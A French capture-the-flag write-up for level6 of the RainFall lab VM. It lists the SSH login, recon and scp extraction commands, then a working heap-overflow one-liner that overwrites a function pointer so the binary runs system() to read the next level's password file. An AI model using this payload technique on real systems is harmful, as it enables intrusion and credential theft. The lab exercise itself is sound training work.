# Level6 — Commandes

## Connexion

```bash
ssh level6@localhost -p 4242
```

Mot de passe : (dans `level5/flag`)

---

## Recon

```bash
pwd
ls -la
file level6
readelf -h level6
```

Extraction (depuis l’hôte, dans `level6/`) :  
`sshpass -p '<level6_password>' scp -o StrictHostKeyChecking=no -P 4242 level6@localhost:level6 ./level6.bin`

Voir `analysis.md`.

---

## Exploitation

Vulnérabilité **overflow** : `strcpy(buffer, argv[1])` sans limite ; le bloc suivant contient un **pointeur de fonction** (initialement **m** → "Nope"). En écrasant ce pointeur par l’adresse de **n** (0x08048454), le programme exécute **n()** → `system("/bin/cat /home/user/level7/.pass")`.

### Offset 72 (RainFall)

Sur RainFall le pointeur de fonction est à **72** octets (64 + en-tête de chunk). Commande validée :

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

Si sur une autre VM ça ne marche pas : essayer d’abord offset **64**, puis 72.

### Récupération du mot de passe level7

Le binaire affiche directement le contenu de `/home/user/level7/.pass` en cas de succès. Noter dans `level6/flag`.
